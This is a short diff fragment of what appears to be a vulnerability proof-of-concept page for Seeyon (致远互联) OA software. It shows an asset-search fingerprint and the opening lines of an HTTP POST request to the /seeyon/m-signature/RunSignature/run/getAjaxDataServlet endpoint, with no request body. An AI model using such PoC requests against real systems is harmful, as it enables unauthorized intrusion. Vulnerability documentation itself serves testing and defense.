@@ -8,7 +8,7 @@
 app="致远互联-OA"
 ```
 
-## poc
+## POC
 ```
 POST /seeyon/m-signature/RunSignature/run/getAjaxDataServlet HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
